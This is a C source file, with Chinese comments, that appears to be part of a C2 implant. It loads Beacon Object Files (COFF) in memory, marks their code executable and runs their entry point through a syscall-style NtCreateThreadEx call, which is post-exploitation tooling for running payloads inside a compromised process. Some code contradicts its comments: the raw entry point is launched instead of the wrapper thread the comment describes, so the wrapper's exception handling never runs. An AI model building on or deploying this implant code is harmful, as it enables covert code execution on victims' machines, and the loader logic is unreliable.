#include "beacon_bof_internal.h"

typedef VOID (__cdecl *BOF_ENTRY)(PCHAR, DWORD);

typedef struct BofEntryCall {
    BofJobRuntime* runtime;
    PVOID entry_point;
    PVOID argument;
    DWORD argument_size;
} BofEntryCall;

/* 存储 BOF 入口线程信息到运行时结构 */
static VOID BofRuntimeStoreThread(BofJobRuntime* runtime, HANDLE hThread, DWORD threadId)
{
    if (!runtime) return;

    EnterCriticalSection(&runtime->lock);
    runtime->entry_thread    = hThread;
    runtime->entry_thread_id = threadId;
    InterlockedExchange(&runtime->entry_started, 1);
    LeaveCriticalSection(&runtime->lock);
}

/* 关闭并清理 BOF 入口线程句柄 */
static VOID BofRuntimeCloseEntryThread(BofJobRuntime* runtime)
{
    HANDLE hThread = NULL;

    if (!runtime) return;

    EnterCriticalSection(&runtime->lock);
    hThread = runtime->entry_thread;
    runtime->entry_thread    = NULL;
    runtime->entry_thread_id = 0;
    LeaveCriticalSection(&runtime->lock);

    if (hThread) {
        CloseHandle(hThread);
    }
}

/* 释放 BOF 运行时结构（清零后释放） */
VOID BofRuntimeFree(BofJobRuntime* runtime)
{
    if (!runtime) return;

    BofRuntimeUnregister(runtime);
    BofRuntimeCloseEntryThread(runtime);
    if (runtime->bss_entries) {
        SecureZeroMemory(runtime->bss_entries,
                         (SIZE_T)runtime->bss_entry_capacity * sizeof(BSSEntry));
        HeapFree(GetProcessHeap(), 0, runtime->bss_entries);
        runtime->bss_entries = NULL;
    }
    DeleteCriticalSection(&runtime->lock);
    SecureZeroMemory(runtime, sizeof(*runtime));
    HeapFree(GetProcessHeap(), 0, runtime);
}

static LONG BofEntryExceptionFilter(BofJobRuntime* runtime, PEXCEPTION_POINTERS exceptionInfo)
{
    if (runtime && exceptionInfo &&
        InterlockedCompareExchange(&runtime->exception_seen, 1, 0) == 0) {
        runtime->exception_code =
            exceptionInfo->ExceptionRecord->ExceptionCode;
        runtime->exception_address =
            exceptionInfo->ExceptionRecord->ExceptionAddress;
    }

    return EXCEPTION_EXECUTE_HANDLER;
}

static DWORD WINAPI BofEntryThreadProc(PVOID param)
{
    BofEntryCall* call = (BofEntryCall*)param;
    BofJobRuntime* runtime;
    BOF_ENTRY entry;

    if (!call || !call->runtime || !call->entry_point) return 1;

    runtime = call->runtime;
    entry = (BOF_ENTRY)call->entry_point;

    BofRuntimeSetCurrent(runtime);
    __try {
        entry((PCHAR)call->argument, call->argument_size);
    } __except (BofEntryExceptionFilter(runtime, GetExceptionInformation())) {
    }
    BofRuntimeSetCurrent(NULL);

    return 0;
}

/* 通过包装线程调用 BOF 入口，以便设置动态 TLS 并保留父线程清理能力。 */
static BOOL BofHitEntryPoint(BeaconContext* ctx, BofJobRuntime* runtime,
                             PVOID pvEntryPoint, PVOID pvArgument, DWORD dwArgSize)
{
    BofEntryCall* call = NULL;
    HANDLE hThread = NULL;
    DWORD threadId = 0;
    DWORD waitResult;

    if (!ctx || !runtime || !pvEntryPoint ||
        !ctx->api.pfnNtCreateThreadEx || !ctx->api.pfnWaitForSingleObject) {
        BofSetError(runtime, "missing BOF entry thread API");
        return FALSE;
    }

    if (!BofRuntimeEnsureInit()) {
        BofSetError(runtime, "failed to initialize BOF runtime TLS");
        return FALSE;
    }

    call = (BofEntryCall*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(*call));
    if (!call) {
        BofSetError(runtime, "failed to allocate BOF entry call");
        return FALSE;
    }

    call->runtime = runtime;
    call->entry_point = pvEntryPoint;
    call->argument = pvArgument;
    call->argument_size = dwArgSize;

    /* 通过 syscall 槽位创建入口线程（NtCreateThreadEx 无 TID 输出，存 0）。 */
    {
        NTSTATUS st = ctx->api.pfnNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL,
                                                   (HANDLE)-1, pvEntryPoint, call,
                                                   0, 0, 0, 0, NULL);

        if (!NT_SUCCESS(st)) {
            HeapFree(GetProcessHeap(), 0, call);
            BofSetError(runtime, "failed to start BOF entry thread: 0x%08lX",
                        (ULONG)st);
            return FALSE;
        }
    }

    BofRuntimeStoreThread(runtime, hThread, threadId);
    for (;;) {
        waitResult = ctx->api.pfnWaitForSingleObject(hThread, 250);
        if (waitResult == WAIT_OBJECT_0) {
            break;
        }
        if (waitResult != WAIT_TIMEOUT) {
            BofSetError(runtime, "failed waiting for BOF entry thread: 0x%08lX", waitResult);
            break;
        }
        if ((runtime->stop_event &&
             ctx->api.pfnWaitForSingleObject(runtime->stop_event, 0) == WAIT_OBJECT_0) ||
            JobIsCancelRequested(runtime->job)) {
            /* BOF 仅支持协作取消；继续等待入口线程自行返回。 */
        }
    }

    InterlockedExchange(&runtime->entry_done, 1);
    HeapFree(GetProcessHeap(), 0, call);

    if (waitResult != WAIT_OBJECT_0) {
        if (!runtime->last_error[0]) {
            BofSetError(runtime, "failed waiting for BOF entry thread: 0x%08lX", waitResult);
        }
        return FALSE;
    }

    return TRUE;
}

/* 查找入口点、设置 .text 段可执行、执行 BOF */
BOOL BofRun(BeaconContext* ctx, BofJobRuntime* runtime, PCOFFEE pCoffee, PCHAR szEntryPoint,
            PVOID pvArgument, DWORD dwArgSize)
{
    DWORD cnt = 0;
    PVOID entry_point = NULL;
    SIZE_T secSize = 0;
    ULONG oldProtect = 0;
    BOOL ok = FALSE;

    for (cnt = 0; cnt < pCoffee->Header->NumberOfSymbols; cnt++) {
        if (memcmp(pCoffee->Symbol[cnt].First.Name, szEntryPoint, BofStrLen(szEntryPoint)) == 0) {
            entry_point = (PVOID)(pCoffee->SecMap[pCoffee->Symbol[cnt].SectionNumber - 1].Ptr +
                pCoffee->Symbol[cnt].Value);
            break;
        }
    }

    if (!entry_point) {
        BofSetError(runtime, "entry point not found: %s", szEntryPoint ? szEntryPoint : "(null)");
        return FALSE;
    }

    for (cnt = 0; cnt < pCoffee->Header->NumberOfSections; cnt++) {
        pCoffee->Section = (PCOFF_SECTION)((ULONG_PTR)pCoffee->Data +
            sizeof(COFF_FILE_HEADER) + (ULONG_PTR)(sizeof(COFF_SECTION) * cnt));
        if (BofHashString(pCoffee->Section->Name, COFF_PREP_TEXT_SIZE, FALSE) == COFF_PREP_TEXT) {
            secSize = pCoffee->SecMap[cnt].Size;
            if (secSize != 0 &&
                ctx->api.pfnNtProtectVirtualMemory((HANDLE)-1, &pCoffee->SecMap[cnt].Ptr,
                    &secSize, PAGE_EXECUTE_READ, &oldProtect) != 0) {
                BofSetError(runtime, "failed to protect BOF .text");
                return FALSE;
            }
        }
    }

    InterlockedExchange(&runtime->exception_seen, 0);
    runtime->exception_code = 0;
    runtime->exception_address = NULL;
    ok = BofHitEntryPoint(ctx, runtime, entry_point, pvArgument, dwArgSize);

    if (!ok) {
        return FALSE;
    }
    if (InterlockedCompareExchange(&runtime->exception_seen, 0, 0) != 0) {
        BofSetError(runtime, "entry raised exception 0x%08lX at %p",
                    runtime->exception_code, runtime->exception_address);
        return FALSE;
    }

    return TRUE;
}
